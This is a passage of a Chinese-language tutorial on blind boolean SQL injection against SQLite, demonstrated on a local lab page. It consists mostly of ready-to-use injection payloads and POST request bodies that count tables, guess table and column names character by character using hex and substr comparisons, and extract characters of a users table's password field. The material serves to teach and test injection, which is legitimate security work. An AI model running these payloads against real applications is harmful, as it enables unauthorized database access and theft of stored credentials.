    tag=ubuntu&search=Check+Plan
让我们开始吧!
**计算表单数量**
为了计算表单的数量，我们可以使用如下payload：
    and (SELECT count(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' ) 。
    http://127.0.0.1/sqlite-lab/index.php
    POST body data
    tag=ubuntu' and (SELECT count(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' ) =2 -- -&search=Check+Plan
确认了表单数量后，我们就一个接一个地猜解表名。
**猜解表名**
为了猜解表名长度，可以使用以下payload：
    and (SELECT length(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name not like 'sqlite_%' limit 1 offset 0)=table_name_length_number
此处，将table_name_length_number替换为数字，如以下我们确认第一个表名长度是否小于6，payload：
    and (SELECT length(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' limit 1 offset 0)  hex('some_char')
该payload提取表名然后提取其中字符，将其转换为hex表示，再跟我们猜测的值进行对比。hex(substr(name,1,1))函数从指定位置提取表名中的一个字符。在上述代码中，substr函数从位置1提取一个字符，再将其转换为hex形式。如果是hex(substr(name,3,1))则表示从第3位开始，截取一个字符。在payload最后，hex('some_char')是我们需要猜测的指定表名字符，hex函数将会将其转换为hex值，这将会让我们的注入更加快速一些。
一旦我们得到表名的第一个字符后，我们将继续猜解第二个字符，为了猜解下一个字符，我们需要改变sbustr函数中代表字符所在位置的数字。即hex(substr(name,1,1))中将1,1改为2，1，接着，我们再进行相同的步骤直到猜解完毕。
让我们来看看具体情况，首先我们将猜解表名第一个字母是否大于'a'：
    http://127.0.0.1/sqlite-lab/index.php
    POST body data
    tag=ubuntu' and (SELECT hex(substr(tbl_name,1,1)) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' limit 1 offset 0) > hex('a')-- -&search=Check+Plan
页面响应与未被注入时一致，这意味着表名的第一个字符大于'a'，在第二次测试中，我们尝试字符k，即测试表名第一个字符是否大于字母'k'，因此，请求长这样：
    http://127.0.0.1/sqlite-lab/index.php
    POST body data
    tag=ubuntu' and (SELECT hex(substr(tbl_name,1,1)) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' limit 1 offset 0) > hex('k')-- -&search=Check+Plan
现在，页面响应与之前普通页面不一致了，即说明表名第一个字符不大于字母k。因此，通过上面两个请求，我们得出表名第一个字符在'a'和'k'之间。在多次尝试后，我们就可以将范围缩到两个前后为同一个字符，这时我们使用=来判断：
    http://127.0.0.1/sqlite-lab/index.php
    POST body data
    tag=ubuntu' and (SELECT hex(substr(tbl_name,1,1)) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' limit 1 offset 0) = hex('i')-- -&search=Check+Plan
以上就是通过fuzz猜解表名的过程，为了继续猜解下一个字符，只需要将hex(substr(name,1,1))中的1，1改为2，1即可，其余不变，然后就继续猜解直到完全猜解出来为止吧。
**猜解列名**
为了猜解列名，我们将会使用如下payload来获取列名列表：
    replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(substr((substr(sql,instr(sql,'(')%2b1)),instr((substr(sql,instr(sql,'(')%2b1)),'`')),"TEXT",''),"INTEGER",''),"AUTOINCREMENT",''),"PRIMARY KEY",''),"UNIQUE",''),"NUMERIC",''),"REAL",''),"BLOB",''),"NOT NULL",''),",",'~~'),"`","")
以上，在“中的即为列名，上面提到的payload将会提取出所有列名，为了提取相应字符数据需要将其转换为hex再进行比较，以下payload将会有所帮助：
    hex(substr(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(substr((substr(sql,instr(sql,'(')%2b1)),instr((substr(sql,instr(sql,'(')%2b1)),'`')),"TEXT",''),"INTEGER",''),"AUTOINCREMENT",''),"PRIMARY KEY",''),"UNIQUE",''),"NUMERIC",''),"REAL",''),"BLOB",''),"NOT NULL",''),",",'~~'),"`",""),column-name_character_numer,1))
你只需要将上面payload中的column-name_character_numer替换为相应的数字即可，比如想要猜解列名列表中的第一个字符，你只需将其替换为1.本例中的SQL盲注payload如下：
    and (select hex(substr(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(substr((substr(sql,instr(sql,'(')%2b1)),instr((substr(sql,instr(sql,'(')%2b1)),'`')),"TEXT",''),"INTEGER",''),"AUTOINCREMENT",''),"PRIMARY KEY",''),"UNIQUE",''),"NUMERIC",''),"REAL",''),"BLOB",''),"NOT NULL",''),",",'~~'),"`",""),1,1)) FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name NOT LIKE 'sqlite_%' and name='info') hex(‘some_char’)
让我们开始提取数据的第一个字符吧，payload：
    and (Select hex(substr(password,1,1)) from users limit 1 offset 0) > hex('k')
注入请求：
    http://127.0.0.1/sqlite-lab/index.php
    Post body data
    tag=ubuntu' and (Select hex(substr(password,1,1)) from users limit 1 offset 0) >hex('a')-- -&search=Check+Plan
页面内容与之前一致，我们可以确定第一个字符在'a'之后，将字符换位'k‘，然后我们就可以看到页面不一致。
于是得到第一个字符位于'a'到'k'之间。后续猜解过程与前面猜解表名和列名一致，重复猜解动作直到猜解出所有字符为止。
**致谢**
特别感谢IndiShell Crew 和 Myhackerhouse给我的灵感。
**参考链接**